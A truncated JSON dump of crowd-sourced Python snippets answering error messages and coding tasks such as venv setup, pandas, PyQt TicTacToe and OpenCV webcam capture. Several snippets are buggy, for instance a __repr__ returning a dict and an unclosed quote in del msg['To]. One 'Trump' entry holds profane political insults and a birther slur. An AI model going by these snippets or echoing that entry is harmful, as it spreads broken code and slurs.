    "id": 213,
    "keyword": null,
    "link": null,
    "title": " The virtual environment was not created successfully because ensurepip is not available. On Debian/Ubuntu systems, you need to install the python3-venv package using the following command.",
    "description": "sudo apt-get install python3.6-venv\n# einstall virtual environment by mentioning current  # python version(3.8) as follow  $ sudo apt-get install python3.xx-venv\n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 214,
    "keyword": null,
    "link": null,
    "title": " TicTacToe with PyQt5",
    "description": "import sys from PyQt5.QtCore import QPointF, QRectF, Qt from PyQt5.QtGui import QPainter, QPen from PyQt5.QtWidgets import (QApplication, QGraphicsItem, QGraphicsScene,                              QGraphicsView)  class TicTacToe(QGraphicsItem):     # http://pyqt.sourceforge.net/Docs/PyQt5/api/QtWidgets/qgraphicsitem.html      def __init__(self):         super(TicTacToe, self).__init__()         self.board = [[None, None, None],[None, None, None], [None, None, None]]         self.O = 0         self.X = 1         self.turn = self.O      def boundingRect(self):         # http://doc.qt.io/qt-5/qgraphicsitem.html#boundingRect         return QRectF(0,0,300,300)      def select(self, x, y):         if x < 0 or y < 0 or x >= 3 or y >= 3:             return         if self.board[y][x] == None:             self.board[y][x] = self.turn             self.turn = 1 - self.turn      def paint(self, painter, option, widget):         # http://doc.qt.io/qt-5/qgraphicsitem.html#paint         painter.setPen(Qt.black)         painter.drawLine(0,100,300,100)         painter.drawLine(0,200,300,200)         painter.drawLine(100,0,100,300)         painter.drawLine(200,0,200,300)         for y in range(3):             for x in range(3):                 if self.board[y][x] == self.O:                     painter.setPen(QPen(Qt.red, 3))                     painter.drawEllipse(QPointF(50+x*100, 50+y*100), 35, 35)                 elif self.board[y][x] == self.X:                     painter.setPen(QPen(Qt.blue, 3))                     painter.drawLine(20+x*100, 20+y*100, 80+x*100, 80+y*100)                     painter.drawLine(20+x*100, 80+y*100, 80+x*100, 20+y*100)      def mousePressEvent(self, event):         # http://doc.qt.io/qt-5/qgraphicsitem.html#mousePressEvent         self.select(int(event.pos().x()/100), int(event.pos().y()/100))         self.update()  class MainWindow(QGraphicsView):     # http://pyqt.sourceforge.net/Docs/PyQt5/api/QtWidgets/qgraphicsview.html     def __init__(self):         super(MainWindow, self).__init__()         scene = QGraphicsScene(self)         self.tictactoe = TicTacToe()         scene.addItem(self.tictactoe)         scene.setSceneRect(0, 0, 300, 300)         self.setScene(scene)         self.show() \n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 215,
    "keyword": null,
    "link": null,
    "title": " Tk.destroy arguments",
    "description": "root = Tk() #make sure that you define your Tkinter window , even though if you dont by impoerting tkinter if no Tk() window is defined it will automatically create one  root.destroy() #here Tk.destroy() WILL NOT WORK\n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 216,
    "keyword": null,
    "link": null,
    "title": " To check pip version",
    "description": "pip --version\npip -V\n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 217,
    "keyword": null,
    "link": null,
    "title": " Topological Sort Python",
    "description": "from collections import defaultdict  class Graph:      def __init__(self,n):          self.graph = defaultdict(list)          self.N = n      def addEdge(self,m,n):          self.graph[m].append(n)      def sortUtil(self,n,visited,stack):          visited[n] = True          for element in self.graph[n]:              if visited[element] == False:                  self.sortUtil(element,visited,stack)          stack.insert(0,n)      def topologicalSort(self):          visited = [False]*self.N          stack =[]          for element in range(self.N):              if visited[element] == False:                  self.sortUtil(element,visited,stack)          print(stack)  graph = Graph(5) graph.addEdge(0,1); graph.addEdge(0,3); graph.addEdge(1,2); graph.addEdge(2,3); graph.addEdge(2,4); graph.addEdge(3,4);  print(\"The Topological Sort Of The Graph Is:  \")  graph.topologicalSort() \n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 218,
    "keyword": null,
    "link": null,
    "title": " Trump",
    "description": "if (Donald_Trump.Personality == Personality.evil) { \tIlluminate.Takeover.Start(); }\ntrump baf\nworst president ever\nFake news\nlol trump egg\nBest president ever.  Fuck Barack Kenyabama.\na failure\nfuck this guy.\nprint(\"goooooooo\")\n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 219,
    "keyword": null,
    "link": null,
    "title": " TypeError: 'pygame.Surface' object is not subscriptable",
    "description": "TypeError: 'pygame.Surface' object is not subscriptable\nscreen.blit(playerImg, (x, y)) you need to remeber the commas\n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 220,
    "keyword": null,
    "link": null,
    "title": " TypeError: dict is not a sequence",
    "description": "# If you're using SQLAlchemy: # Use \"%%\" instead of \"%\" in your queries, because # a single \"%\" is used in Python string formatting.  # Alternatively escape the SQL properly with sqlalchemy.text(...): engine.execute(sqlalchemy.text(sql_query))\nyou need to use %% in python for % you are using in your like statements. % in python is used for string formatting\n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 221,
    "keyword": null,
    "link": null,
    "title": " TypeError: exceptions must derive from BaseException",
    "description": "#When using raise, it must be given an Exeption class or one that inherits from it. #e.g.ValueError, IndexError, KeyError raise ValueError(\"I'm a fancy error message\")\n",
    "reg_date": "2021-10-12T11:27:49.000Z"
  },
  {
    "id": 222,
    "keyword": null,
    "link": null,
    "title": " TypeError: takes 0 positional arguments but 1 was given python",
    "description": "When Python tells you \"generatecode() takes 0 positional arguments but 1 was given\", it's telling you that your method is set up to take no arguments, but the self argument is still being passed when the method is called, so in fact it is receiving one argument.  Adding self to your method definition should resolve the problem.\n#-----import statements----- import turtle as trtl import random as rand  # creating diablo diablo = trtl.Turtle(\"arrow\") diablo.shapesize(2) diablo.fillcolor(\"pink\") score = 0  score_keeper = trtl.Turtle() score_keeper.hideturtle() score_keeper.penup() score_keeper.goto(200,200) score_keeper.pendown()   counter = trtl.Turtle() font_setup = (\"Arial\", 20, \"normal\") timer = 5 counter_interval = 1000   #1000 represents 1 second timer_up = False counter.hideturtle() counter.penup() counter.goto(-10,200)  reset_button = trtl.Turtle(\"circle\") reset_button.penup() reset_button.goto(-100,-100)   # making new x and y values for diablo def scored():     global score     score += 1     score_keeper.clear()     score_keeper.write(score)  def change_position():     a = rand.randint(-250,250)     b = rand.randint(-250,250)     diablo.penup()     diablo.goto(a,b)  def countdown():     global timer, timer_up     counter.clear()     if timer <= 0:         counter.write(\"Time's Up\", font=font_setup)         timer_up = True         diablo.hideturtle()     else:         counter.write(\"Timer: \" + str(timer), font=font_setup)         timer -= 1         counter.getscreen().ontimer(countdown, counter_interval)  def reset_now(self):     counter = 0     score = 0     diablo.showturtle()  # naming when diablo gets clicked then changing position def diablo_clicked(x, y):     scored()     change_position()      diablo.onclick(diablo_clicked) reset_button.onclick(reset_now) wn = trtl.Screen() wn.ontimer(countdown, counter_interval) wn.bgcolor(\"#79F0FF\")  wn.mainloop()\n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 223,
    "keyword": null,
    "link": null,
    "title": " USB: usb device handle win.cc:1049 Failed to read descriptor from node connection: A device attached to the system is not functioning. (0x1F)",
    "description": "# windows only  # missing library open cmd and type pip install pywin32\n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 224,
    "keyword": null,
    "link": null,
    "title": " Unable to locate package python-pip",
    "description": "sudo apt-get install software-properties-common sudo apt-add-repository universe sudo apt-get update sudo apt-get install python-pip\nsudo add-apt-repository universe sudo apt-get update \napt-get install curl  curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py  python get-pip.py \n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 225,
    "keyword": null,
    "link": null,
    "title": " UnicodeDecodeError: 'charmap' codec can't decode byte 0x9d in position 6148: character maps to <undefined>",
    "description": "Add encoding: \t \tfile = open(filename, encoding=\"utf8\")\n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 226,
    "keyword": null,
    "link": null,
    "title": " UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe7 in position 5: invalid continuation byte",
    "description": "pd.read_csv('ml-100k/u.item', sep='|', names=m_cols , encoding='latin-1')\n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 227,
    "keyword": null,
    "link": null,
    "title": " UnicodeDecodeError: 'utf-8' codec can't decode byte invalid start byte",
    "description": "import pandas as pd data = pd.read_csv(filename, encoding= 'unicode_escape')\n# Use 'ISO-8859-1' instead of \"utf-8\" for decoding text = open(fn, 'rb').read().decode('ISO-8859-1')\n#use rb over r with open(path, 'rb') as f:   text = f.read()\n[Solved] UnicodeDecodeError: &lsquo;utf8&rsquo; codec can&rsquo;t decode byte 0xa5 in position 0: invalid start byte\n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 228,
    "keyword": null,
    "link": null,
    "title": " Use miraculous with token",
    "description": "from miraculous import login  login(\"bot token\") \n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 229,
    "keyword": null,
    "link": null,
    "title": " UserWarning: Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning warnings.warn('Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning'",
    "description": "pip install python-Levenshtein\n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 230,
    "keyword": null,
    "link": null,
    "title": " ValueError: Cannot specify ',' with 's'.",
    "description": "pop = \"4534305483\" print(format(int(pop),\",\")) #Make sure to convert to an integer #4,534,305,483\n>>> print(format(int(pop),\",\")) 4,534,305,483\n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 231,
    "keyword": null,
    "link": null,
    "title": " ValueError: Failed to convert a NumPy array to a Tensor (Unsupported object type float).",
    "description": "np.asarray(x).astype('float32')  #otherwise probably faulty data\n(Keras) ValueError: Failed to convert a NumPy array to a Tensor (Unsupported object type float)\n",
    "reg_date": "2021-10-12T11:27:50.000Z"
  },
  {
    "id": 232,
    "keyword": null,
    "link": null,
    "title": " ValueError: Feature (key: age) cannot have rank 0. Given: Tensor(\"linear/linear model/Cast:0\", shape=(), dtype=float32)",
    "description": "'''Feature cannot have rank 0 issue occurs when we dont specify batch_size  \twith input_fn or eval_fn or predict_fn with estimator api''' dataset = tf.data.TextLineDataset(data_file) dataset = dataset.map(parse_csv) dataset = dataset.batch(10) # or any other batch size \n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 233,
    "keyword": null,
    "link": null,
    "title": " ValueError: There may be at most 1 Subject headers in a message",
    "description": "for email in email_list:     msg['To'] = email     server = smtplib.SMTP(host='smtp.gmail.com', port=587)     server.starttls()     server.login(\"myemail@gmail.com\", \"mypassword\")     server.send_message(msg)     server.quit()     del msg['To]  <----- Delete the subject of the message to resend. \n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 234,
    "keyword": null,
    "link": null,
    "title": " ValueError: Tz-aware datetime.datetime cannot be converted to datetime64 unless utc=True site:stackoverflow.com",
    "description": "df['DateTime'] = pd.to_datetime(df['DateTime'], utc=True)\n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 235,
    "keyword": null,
    "link": null,
    "title": " ValueError: cannot mask with array containing NA / NaN values",
    "description": "mask = dframe.Product.str.contains(word, case=False, na=False)\n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 236,
    "keyword": null,
    "link": null,
    "title": " WARNING: This is a development server. Do not use it in a production deployment.",
    "description": "> set FLASK_APP=hello > set FLASK_ENV=development > flask run \n$ export FLASK_APP=example $ export FLASK_ENV=development $ flask run \n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 237,
    "keyword": null,
    "link": null,
    "title": " WARNING: You are using pip version 19.2.3, however version 21.2.4 is available.",
    "description": "pip3 install --upgrade pip\npip3 install --upgrade pip --user\n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 238,
    "keyword": null,
    "link": null,
    "title": " Why do we use graphs?",
    "description": "print\"to help us learn visaully\"\n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 239,
    "keyword": null,
    "link": null,
    "title": " Write a NumPy program to create a random array with 1000 elements and compute the average, variance, standard deviation of the array elements.",
    "description": "import numpy as np x = np.random.randn(1000) print(\"Average of the array elements:\") mean = x.mean() print(mean) print(\"Standard deviation of the array elements:\") std = x.std() print(std) print(\"Variance of the array elements:\") var = x.var() print(var)\n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 240,
    "keyword": null,
    "link": null,
    "title": " Write a Python Program to implement your own myreduce() function which works exactly like Python's built-in function reduce()",
    "description": "def myreduce(anyfunc, sequence):   # Get first item in sequence and assign to result   result = sequence[0]  # iterate over remaining items in sequence and apply reduction function    for item in sequence[1:]:    result = anyfunc(result, item)    return result\n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 241,
    "keyword": null,
    "link": null,
    "title": " Write a Python program to append text to a file and display the text.",
    "description": "def Appendtext(fname): \twith open(fname,'a+') as f: \t\tf.write('appending line 1, ') \t\tf.write('appending line 2. ') \tf.close() # y=open('file1.txt') # print(y.read()) Appendtext('file1.txt')  x= open('file1.txt') print(x.read())\n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 242,
    "keyword": null,
    "link": null,
    "title": " Write a Python program to create a file containing student records where each record contain  rollno and marks in 3 subjects separated by a comma (marks to be considered as list of 3 values).",
    "description": "##Write a Python program to create a file of elements of any data type (mixed data type, i.e. some  elements maybe of type int, some elements of type float and some elements of type string). Split  this file into three file containing elements of same data type (i.e. 1st file of integers only, 2nd file of float only and 3rd file of strings only). Take input from the user to create the file.   f = open('MixedFile.txt','w') while True :     user = input(\"Enter Any Data Type Element :: \")     if user == 'end':         print('!!!!!!!! EXIT !!!!!!!!!!!!')         break     else :         f.write(user + '\\n') f.close() f = open('MixedFile.txt') a = [] a = f.read().split() f.close() fs = open ('StringFile.txt','w') ff = open ('FloatFile.txt','w') fn = open ('NumberFile.txt','w') for i in a :     try:         int(i)         fn.write(i + '\\n')     except:             try:                 float(i)                 ff.write(i + '\\n')             except:                 fs.write(i + '\\n') f.close() fs.close() fn.close() ff.close()  print(\"reading................\") fs = open ('StringFile.txt','r') ff = open ('FloatFile.txt','r') fn = open ('NumberFile.txt','r') print(fs.read()) print(fn.read()) print(ff.read()) \n##Write a Python program to create a file containing student records where each record contain  rollno and marks in 3 subjects separated by a comma (marks to be considered as list of 3 values).  e.g. records of students: 1, [45, 40, 35], 2, [41, 38, 39], 3, [35, 30, 37] (each line of the file  containing record of only 1 student). Prepare mark list in the following format:   ##Roll No. Mark-1 Mark-2 Mark-3 Total   ##      1      45 \t40 \t 35    120   stud = {} mrk = [] print(\"ENTER ZERO NUMBER FOR EXIT !!!!!!!!!!!!\") print(\"ENTER STUDENT INFORMATION ------------------------ \") while True :     rno = int(input(\"enter roll no.. :: -- \"))     if rno == 0 :         break     else:          for i in range(3):              print(\"enter marks  \",i+1,\" :: --  \",end = \" \")              n = int(input())              mrk.append(n)     stud[rno] = mrk     mrk = [] print(\"Records are ------ \",stud) f = open ('studFile.txt','w') print(\"\\nRollNo\\t Mark1\\t Mark2\\t Mark3\\t Total\") f.write(\"RollNo\\t Mark1\\t Mark2\\t Mark3\\t Total \\n\") tot = 0 for r in stud:     print(r,\"\\t\",end=\" \")     f.write(str(r) + \"\\t\" )     for m in stud[r] :         tot = tot + m         print(m,\"\\t\",end=\" \")         f.write(str(m) + \"\\t\" )     print(tot)     f.write(str(tot) + '\\n')     tot = 0 f = open ('studFile.txt') print(f.read()) \n##Write a Python program to create a file of strings by taking input from the user and then create  a dictionary containing each string along with their frequencies. (e.g. if the file contains &lsquo;apple&rsquo;,  &lsquo;banana&rsquo;, &lsquo;fig&rsquo;, &lsquo;apple&rsquo;, &lsquo;fig&rsquo;, &lsquo;banana&rsquo;, &lsquo;grapes&rsquo;, &lsquo;fig&rsquo;, &lsquo;grapes&rsquo;, &lsquo;apple&rsquo; then the output should  be {'apple': 3, 'banana': 2, 'fig': 3, 'grapes': 2}.   lst = [] d = dict() print(\"ENTER ZERO NUMBER FOR EXIT !!!!!!!!!!!!\") while True:     user = input('enter string element :: -- ')     if user == \"0\":         break     else:         lst.append(user) print(\"LIST ELEMENR ARE :: \",lst) l = len(lst) for i in range(l) :     c = 0     for j in range(l) :         if lst[i] == lst[j ]:             c += 1     d[lst[i]] = c print(\"dictionary is  :: \",d) f = open('FrequencyDictFile.txt','w') f.write(str(d)) f.close() f = open('FrequencyDictFile.txt') print(f.read()) \n",
    "reg_date": "2021-10-12T11:27:51.000Z"
  },
  {
    "id": 243,
    "keyword": null,
    "link": null,
    "title": " Write a Python program to read a file line by line and store it into a list.",
    "description": "def conftolist(fname,mode='r+'): \twith open(fname) as f: \t\tlines = [line.strip() for line in f] \t\tprint(lines)  conftolist('file1.txt') ############  with open('file1.txt','r+') as f: \t# li = list(f) \t# print(li) \tls=[] \tfor l in f: \t\tls.append(l.strip()) \tprint(ls) \n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 244,
    "keyword": null,
    "link": null,
    "title": " Write a Python program to read a file line by line store it into an array",
    "description": "def conftolist(fname,mode='r+'): \twith open(fname) as f: \t\tlines = [line.strip() for line in f] \t\tprint(lines)  conftolist('file1.txt') ############  with open('file1.txt','r+') as f: \t# li = list(f) \t# print(li) \tls=[] \tfor l in f: \t\tls.append(l.strip()) \tprint(ls) \n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 245,
    "keyword": null,
    "link": null,
    "title": " Write a Python program to read first n lines of a file",
    "description": "f = open(\"test.txt\", 'r') variable = f.readline(1) print(variable)\ndef read_lines(fname,n,mode='r+'): \twith open(fname) as f: \t\tfor i in range(n): \t\t\tprint(f.readline())  read_lines('file1.txt',2) ####################### def readnline(fname,lines,mode='r+'): \twith open(fname) as f: \t\tli = [ next(f) for i in range(lines)] \tprint(li)  readnline('file1.txt',1)  #############################\n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 246,
    "keyword": null,
    "link": null,
    "title": " Write a Python program to read last n lines of a file",
    "description": "def read_lastnlines(fname,n): \twith open('file1.txt') as f: \t\tfor line in (f.readlines() [-n:]): \t\t\tprint(line)  read_lastnlines('file1.txt',3)\n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 247,
    "keyword": null,
    "link": null,
    "title": " Write a Python program using function concept that maps list of words into a list of integers representing the lengths of the corresponding words",
    "description": "listOfWords = input('List of Word: ').split()  listOfInts = []   for i in range(len(listOfWords)):     listOfInts.append(len(listOfWords[i]))       print (\"List of wordlength:\"+str(listOfInts))\n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 248,
    "keyword": null,
    "link": null,
    "title": " Write a function to print the count of unique values, minimum and maximum in each row given a random Numpy matrix of size (m,n).",
    "description": "import numpy as np  a = np.array([[1, 3, 3], [4, 5, 4], [7, 7, 9], [3, 3, 5]])  for x in range(len(a)):     print('Unique: ' + str(len(list(set(a[x])))) + ' Max: ' + str(max(a[x])) + ' Min: ' + str(min(a[x]))) \n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 249,
    "keyword": null,
    "link": null,
    "title": " Write python program to take command line arguments (word count). ",
    "description": "import sys print(\"This is the name of the script:\", sys.argv[0]) print(\"Number of arguments:\", len(sys.argv)) print(\"The arguments are:\" , str(sys.argv))  #Example output #This is the name of the script: sysargv.py #Number of arguments in: 3 #The arguments are: ['sysargv.py', 'arg1', 'arg2']\nimport sys  print (\"the script has the name %s\" % (sys.argv[0]) \n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 250,
    "keyword": null,
    "link": null,
    "title": " XLRDError: Excel xlsx file; not supported",
    "description": "pandas.read_excel('cat.xlsx', engine='openpyxl')\npip install xlrd==1.2.0 \n# Make sure pandas is upgraded and that openpyxl is installed then try again pip install pandas --upgrade pip install openpyxl\nAs noted in the release email, linked to from the release tweet and noted in large orange warning that appears on the front page of the documentation, and less orange, but still present, in the readme on the repository and the release on pypi:  xlrd has explicitly removed support for anything other than xls files.  In your case, the solution is to:  make sure you are on a recent version of Pandas, at least 1.0.1, and preferably the latest release. 1.2 will make his even clearer. install openpyxl: https://openpyxl.readthedocs.io/en/stable/ change your Pandas code to be: df1 = pd.read_excel(      os.path.join(APP_PATH, \"Data\", \"aug_latest.xlsm\"),      engine='openpyxl', )\n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 251,
    "keyword": null,
    "link": null,
    "title": "   call   python",
    "description": "#this will allow you to treat object as function class Test:   def __init__(self, num):     self.num = num   def __call__(self, inp):     print(self.num*inp)  #create an instance of Test class obj = Test(5) obj(3) #15 \nclass Foo:     def __call__(self, a, b, c):         # ...  x = Foo() x(1, 2, 3) # __call__\n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 252,
    "keyword": null,
    "link": null,
    "title": "   delattr   python",
    "description": "class test:     attr = 1      def __delattr__(self, item):         object.__delattr__(self, item)  ins = test()  print(ins.attr)  del ins.attr  print(ins.attr)\n",
    "reg_date": "2021-10-12T11:27:52.000Z"
  },
  {
    "id": 253,
    "keyword": null,
    "link": null,
    "title": "   name  ==   main   in python",
    "description": "# If the python interpreter is running that module (the source file) # as the main program, it sets the special __name__ variable to have # a value &ldquo;__main__&rdquo;. If this file is being imported from another  # module, __name__ will be set to the module&rsquo;s name. if __name__=='__main__':   # do something\n# It's as if the interpreter inserts this at the top # of your module when run as the main program. __name__ = \"__main__\" \nif __name__ == \"__main__\": main()\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 254,
    "keyword": null,
    "link": null,
    "title": "   str  ()",
    "description": ">>> class Test: ...     def __repr__(self): ...         return \"Test()\" ...     def __str__(self): ...         return \"member of Test\" ...  >>> t = Test() >>> t Test() >>> print(t) member of Test\n class Person:     name = \"\"     age = 0      def __init__(self, personName, personAge):         self.name = personName         self.age = personAge      def __repr__(self):         return {'name':self.name, 'age':self.age}      def __str__(self):         return 'Person(name='+self.name+', age='+str(self.age)+ ')' \n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 255,
    "keyword": null,
    "link": null,
    "title": "  reverse with prefix() argument after * must be an iterable, not int",
    "description": "#For this example: scores_url = reverse('get_scores', args=(obj.pk))  #putting a comma at the end of the args tuple fixes it. scores_url = reverse('get_scores', args=(obj.pk,))  #Alternatively, as mentioned in the docs, using a list would work fine: scores_url = reverse('get_scores', args=[obj.pk])\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 256,
    "keyword": null,
    "link": null,
    "title": " abc list python",
    "description": "['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n#Python: premade alphabet string   import string string.ascii_lowercase \t#output: 'abcdefghijklmnopqrstuvwxyz' string.ascii_uppercase \t#output: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 257,
    "keyword": null,
    "link": null,
    "title": " absolute value columns pandas",
    "description": "df['Column_name'] = df['Column_name'].abs()\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 258,
    "keyword": null,
    "link": null,
    "title": " access element of dataframe python",
    "description": "df.iloc[row_index][column_index]\nyour_var = df.iloc[row_indexer,column_indexer]\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 259,
    "keyword": null,
    "link": null,
    "title": " access last element of list python",
    "description": "# To get the last element in a list you use -1 as position bikes = ['trek', 'redline', 'giant'] bikes[-1] # Output: # 'giant'\nsome_list[-1]\nMyList=[\"Black\",\"Blue\",\"Red\",\"Green\"] print(MyList[-1])\nprint(list[-1])\n# The smart way  list = [\"first item\", \"second item\", \"third item\"] print(list[len(list) - 1])  # The proper way print(list[-1])\nmylist = [0, 1, 2] mylist[-1] = 3 # sets last element print(myList[-1]) # prints Last element\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 260,
    "keyword": null,
    "link": null,
    "title": " access the value in settings django",
    "description": "#settings.py  EMAIL_PASS = \"FOO\"  # in any file  from django.conf import settings  email_password = settings.EMAIL_PASS #to access that variable.\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 261,
    "keyword": null,
    "link": null,
    "title": " access twitter api using tweepy in python",
    "description": "import tweepy consumer_key= 'your consumer_key' consumer_secret= 'your consumer_key_secret' access_token= 'your access_token' access_token_secret= 'your access_token_secret' auth = tweepy.OAuthHandler(consumer_key, consumer_secret) auth.set_access_token(access_token,access_token_secret) api = tweepy.API(auth) #From here, you can tweet, search tweets, search keywords, etc.\nimport os import tweepy as tw import pandas as pd  consumer_key= 'yourkeyhere' consumer_secret= 'yourkeyhere' access_token= 'yourkeyhere' access_token_secret= 'yourkeyhere' auth = tw.OAuthHandler(consumer_key, consumer_secret) auth.set_access_token(access_token, access_token_secret) api = tw.API(auth, wait_on_rate_limit=True) # Post a tweet from Python api.update_status(\"Look, I'm tweeting from #Python in my #earthanalytics class! @EarthLabCU\") # Your tweet has been posted! # Define the search term and the date_since date as variables search_words = \"#wildfires\" date_since = \"2018-11-16\" # Collect tweets tweets = tw.Cursor(api.search,               q=search_words,               lang=\"en\",               since=date_since).items(5) # Collect tweets tweets = tw.Cursor(api.search,               q=search_words,               lang=\"en\",               since=date_since).items(5)  # Iterate and print tweets for tweet in tweets:     print(tweet.text) # Collect tweets tweets = tw.Cursor(api.search,                        q=search_words,                        lang=\"en\",                        since=date_since).items(5)  # Collect a list of tweets [tweet.text for tweet in tweets]\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 262,
    "keyword": null,
    "link": null,
    "title": " access webcam using opencv",
    "description": "import cv2  cap = cv2.VideoCapture(0)  while True:   ret, frame = cap.read()      cv2.imshow('webcam feed' , frame)   if cv2.waitKey(1) & 0xFF == ord(' '):     break      cap.release() cv2.destroyAllWindows()  #by using the spacebar you will be able to finish the process of video capturing #in opencv and the window will close\n",
    "reg_date": "2021-10-12T11:27:53.000Z"
  },
  {
    "id": 263,
    "keyword": null,
    "link": null,
    "title": " accessing camera with python",
    "description": "import cv2  vid = cv2.VideoCapture(0)  while True:      ret, frame = vid.read()      cv2.imshow('Controlling my computer camera', frame)      if cv2.waitKey(4) & 0xFF == ord('q'):         break   vid.release() cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 264,
    "keyword": null,
    "link": null,
    "title": " accuracy score sklearn syntax",
    "description": ">>> from sklearn.metrics import accuracy_score >>> y_pred = [0, 2, 1, 3] >>> y_true = [0, 1, 2, 3] >>> accuracy_score(y_true, y_pred) 0.5 >>> accuracy_score(y_true, y_pred, normalize=False) 2\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 265,
    "keyword": null,
    "link": null,
    "title": " add age categories pandas dataframe",
    "description": "X_train_data = pd.DataFrame({'Age':[0,2,4,13,35,-1,54]})  bins= [0,2,4,13,20,110] labels = ['Infant','Toddler','Kid','Teen','Adult'] X_train_data['AgeGroup'] = pd.cut(X_train_data['Age'], bins=bins, labels=labels, right=False) print (X_train_data)    Age AgeGroup 0    0   Infant 1    2  Toddler 2    4      Kid 3   13     Teen 4   35    Adult 5   -1      NaN 6   54    Adult\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 266,
    "keyword": null,
    "link": null,
    "title": " add bearer token in python request",
    "description": "import requests  auth_token='sdfghjkloerdtfyguhiopfghjkl;fghjkl' hed = {'Authorization': 'Bearer ' + auth_token} data = {'app' : 'aaaaa'}  url = 'https://api.xy.com' response = requests.post(url, json=data, headers=hed) print(response) print(response.json())\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 267,
    "keyword": null,
    "link": null,
    "title": " add colour to text in python",
    "description": "def colored(r, g, b, text):     return \"\\033[38;2;{};{};{}m{} \\033[38;2;255;255;255m\".format(r, g, b, text)    text = 'Hello, World' colored_text = colored(255, 0, 0, text) print(colored_text)  #or  print(colored(255, 0, 0, 'Hello, World'))\nCEND      = '\\33[0m' CBOLD     = '\\33[1m' CITALIC   = '\\33[3m' CURL      = '\\33[4m' CBLINK    = '\\33[5m' CBLINK2   = '\\33[6m' CSELECTED = '\\33[7m'  CBLACK  = '\\33[30m' CRED    = '\\33[31m' CGREEN  = '\\33[32m' CYELLOW = '\\33[33m' CBLUE   = '\\33[34m' CVIOLET = '\\33[35m' CBEIGE  = '\\33[36m' CWHITE  = '\\33[37m'  CBLACKBG  = '\\33[40m' CREDBG    = '\\33[41m' CGREENBG  = '\\33[42m' CYELLOWBG = '\\33[43m' CBLUEBG   = '\\33[44m' CVIOLETBG = '\\33[45m' CBEIGEBG  = '\\33[46m' CWHITEBG  = '\\33[47m'  CGREY    = '\\33[90m' CRED2    = '\\33[91m' CGREEN2  = '\\33[92m' CYELLOW2 = '\\33[93m' CBLUE2   = '\\33[94m' CVIOLET2 = '\\33[95m' CBEIGE2  = '\\33[96m' CWHITE2  = '\\33[97m'  CGREYBG    = '\\33[100m' CREDBG2    = '\\33[101m' CGREENBG2  = '\\33[102m' CYELLOWBG2 = '\\33[103m' CBLUEBG2   = '\\33[104m' CVIOLETBG2 = '\\33[105m' CBEIGEBG2  = '\\33[106m' CWHITEBG2  = '\\33[107m'\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 268,
